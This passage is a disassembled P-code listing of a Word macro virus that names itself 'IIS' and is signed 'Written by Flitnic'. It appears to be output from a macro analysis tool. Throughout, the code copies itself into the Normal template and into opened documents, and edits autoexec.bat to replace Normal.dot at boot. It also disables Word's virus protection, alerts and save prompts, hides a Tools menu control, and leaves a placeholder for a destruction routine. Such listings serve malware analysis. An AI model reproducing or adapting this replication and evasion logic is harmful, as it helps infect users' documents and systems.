' Line #59:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #60:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	CloseAll 
' Line #62:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #63:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #64:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #65:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #66:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	If 
' 	BoSImplicit 
' 	GoTo ds 
' 	EndIf 
' Line #67:
' 	LitDI2 0x000C 
' 	Ld a 
' 	LineInput 
' Line #68:
' 	Ld a 
' 	LitStr 0x0013 "@del c:\normalb.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fv 
' 	EndIf 
' Line #69:
' 	Loop 
' Line #70:
' 	Label ds 
' Line #71:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #72:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #74:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #75:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #76:
' 	LitStr 0x000E "C:\Normalb.dot"
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #77:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	LitStr 0x0009 "c:\No.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #82:
' 	LitStr 0x0009 "c:\No.dat"
' 	ArgsCall Kill 0x0001 
' Line #83:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #84:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #85:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #86:
' Line #87:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitStr 0x000F "c:\Autoexec.bak"
' 	ArgsCall FileCopy 0x0002 
' Line #88:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #89:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #90:
' 	LitDI2 0x000C 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "@Copy /y C:\normalb.dot "
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x000C 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "@del c:\normalb.dot"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x000C 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "@Copy /y c:\Autoexec.bak c:\Autoexec.bat"
' 	PrintItemNL 
' Line #93:
' 	Label fv 
' Line #94:
' 	CloseAll 
' Line #95:
' 	ExitSub 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Label AtrNo 
' Line #98:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #99:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #100:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #101:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #102:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #103:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Ld ActInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #106:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #108:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #109:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #110:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #111:
' 	ElseBlock 
' Line #112:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Lines 
' Line #113:
' 	LitDI2 0x0001 
' 	Ld Lines 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #114:
' 	LitDI2 0x0001 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	Label esub 
' Line #118:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #119:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #120:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #121:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #122:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #123:
' 	CloseAll 
' Line #124:
' 	LitStr 0x0009 "c:\vn.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #125:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2a 
' 	EndIf 
' Line #126:
' 	LitStr 0x0009 "C:\vn.dll"
' 	ArgsCall Kill 0x0001 
' Line #127:
' 	Label tz2a 
' Line #128:
' 	LitStr 0x0009 "c:\vd.dll"
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #129:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tz2b 
' 	EndIf 
' Line #130:
' 	LitStr 0x0009 "C:\vd.dll"
' 	ArgsCall Kill 0x0001 
' Line #131:
' 	Label tz2b 
' Line #132:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #133:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #136:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St lll 
' Line #137:
' 	QuoteRem 0x0000 0x001E "IIS for NormalTemplate Create:"
' Line #138:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #139:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #140:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #141:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #142:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #143:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #144:
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #145:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #146:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #147:
' 	ExitFor 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #151:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #152:
' 	CloseAll 
' Line #153:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #154:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #155:
' 	CloseAll 
' Line #156:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #157:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	LitDI2 0x0000 
' 	St iii 
' Line #160:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #161:
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #162:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #163:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #164:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #165:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #166:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #167:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #168:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #169:
' Line #170:
' 	QuoteRem 0x0000 0x001E "IIS for ActiveDocument Create:"
' Line #171:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd LCase 0x0001 
' 	LitStr 0x0001 "a"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #172:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #173:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #174:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nomacro 
' 	EndIf 
' Line #175:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	IfBlock 
' Line #176:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #177:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #178:
' 	LitVarSpecial (False)
' 	St aAutoOpen 
' Line #179:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #180:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #181:
' 	Ld a 
' 	LitStr 0x0009 "Sub IIS()"
' 	Eq 
' 	IfBlock 
' Line #182:
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #183:
' 	LitDI2 0x0001 
' 	Ld cl 
' 	Ld Ii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #184:
' 	LitVarSpecial (True)
' 	St aAutoOpen 
' Line #185:
' 	ExitFor 
' Line #186:
' 	EndIfBlock 
' Line #187:
' 	StartForVariable 
' 	Ld Ii 
' 	EndForVariable 
' 	NextVar 
' Line #188:
' 	LitDI2 0x0000 
' 	St Ii 
' Line #189:
' 	Ld aAutoOpen 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #190:
' 	CloseAll 
' Line #191:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #192:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	PrintItemSemi 
' 	Ld XXXXX 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #193:
' 	CloseAll 
' Line #194:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #195:
' 	LitStr 0x000D "c:\newvnb.dll"
' 	ArgsCall Kill 0x0001 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	LitDI2 0x0000 
' 	St iii 
' Line #198:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #199:
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St cl 
' Line #200:
' 	Ld cl 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #201:
' 	StartForVariable 
' 	Ld iii 
' 	EndForVariable 
' 	NextVar 
' Line #202:
' 	LitStr 0x0009 "Sub IIS()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #203:
' 	Ld AutoOpenCode 
' 	LitStr 0x0012 "'Macro created by "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #204:
' 	Ld AutoOpenCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St AutoOpenCode 
' Line #205:
' 	LitDI2 0x0001 
' 	Ld AutoOpenCode 
' 	Ld iii 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #206:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	Label nomacro 
' Line #209:
' 	CloseAll 
' Line #210:
' 	Label MegaJump 
' Line #211:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #212:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #213:
' 	OnError (Resume Next) 
' Line #214:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #215:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St at 
' Line #216:
' 	Ld at 
' 	LitDI2 0x0021 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St at 
' 	EndIf 
' Line #217:
' 	Ld at 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo gghh 
' 	EndIf 
' Line #218:
' 	Ld ormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #219:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #220:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #221:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #223:
' 	LitVarSpecial (False)
' 	LitDI2 0x0003 
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0020 "Insert destruction routine here:"
' Line #226:
' Line #227:
' 	Label gghh 
' Line #228:
' 	EndSub 
' Line #229:
' 	FuncDefn (Private Sub Document_Close())
' Line #230:
' 	Rem 0x000D " MyName = IIS"
' Line #231:
' 	LitStr 0x0009 "c:\No.dat"
' 	ArgsLd Dir 0x0001 
' 	St a 
' Line #232:
' 	Ld a 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "NO.DAT"
' 	Eq 
' 	IfBlock 
' Line #233:
' 	ExitSub 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	CloseAll 
' Line #236:
' 	OnError MegaJump 
' Line #237:
' 	LitStr 0x000C "c:\msdos.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #238:
' 	Do 
' Line #239:
' 	LitDI2 0x0001 
' 	Ld ms 
' 	LineInput 
' Line #240:
' 	Ld ms 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0007 "WINDIR="
' 	Eq 
' 	IfBlock 
' Line #241:
' 	Ld ms 
' 	FnLen 
' 	St a 
' Line #242:
' 	Ld ms 
' 	LitDI2 0x0008 
' 	Ld a 
' 	ArgsLd Mid$ 0x0003 
' 	St windir 
' Line #243:
' 	GoTo fert 
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	Loop 
' Line #246:
' 	CloseAll 
' Line #247:
' 	Label fert 
' Line #248:
' 	CloseAll 
' Line #249:
' 	Ld windir 
' 	LitStr 0x000F "\system\Log.drv"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #250:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "+"
' 	PrintItemNL 
' Line #251:
' 	CloseAll 
' Line #252:
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #253:
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #254:
' 	LitStr 0x0009 "c:\vn.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #255:
' 	LitStr 0x0009 "c:\vd.dll"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #256:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NormInst 
' Line #257:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St ActInst 
' Line #258:
' 	Ld NormInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #259:
' 	Ld ActInst 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0010 "REM MYNAME = IIS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #260:
' Line #261:
' 	CloseAll 
' Line #262:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #263:
' 	LitDI2 0x000C 
' 	Sharp 
' 	Close 0x0001 
' Line #264:
' 	LitStr 0x000F "c:\Autoexec.bat"
' 	LitDI2 0x000C 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #265:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #266:
' 	LitDI2 0x000C 
' 	ArgsLd EOF 0x0001 
' 	If 
' 	BoSImplicit 
' 	GoTo dss 
' 	EndIf 
' Line #267:
' 	LitDI2 0x000C 
' 	Ld a 
' 	LineInput 
' Line #268:
' 	Ld a 
' 	LitStr 0x0013 "@del c:\normalb.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #269:
' 	Loop 
' Line #270:
' 	Label dss 
' Line #271:
' Line #272:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActIntalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo esub 
' 	EndIf 
' Line #273:
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\vn.dll"
' 	St IW 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0009 "C:\Vd.dll"
' 	St IW 
' 	EndIf 
' Line #274:
' 	Ld IW 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #275:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #276:
' 	Do 
' Line #277:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #278:
' 	Ld VirCode 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	LoopUntil 
' Line #279:
' 	Do 
' Line #280:
' 	Ld VirCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ess 
' 	LitDI2 0x0001 
' 	Add 
' 	St ess 
' 	EndIf 
' Line #281:
' 	Ld ess 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #282:
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	LineInput 
' Line #283:
' 	Ld VirCode 
' 	LitStr 0x0016 "Rem Written by Flitnic"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo jump 
' 	EndIf 
' Line #284:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #285:
' 	Loop 
' Line #286:
' 	Label jump 
' Line #287:
' 	Ld FullCode 
' 	Ld VirCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St FullCode 
' Line #288:
' 	Ld FullCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St FullCode 
' Line #289:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #290:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd Dir 0x0001 
' 	St dd 
' Line #291:
' 	Ld dd 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
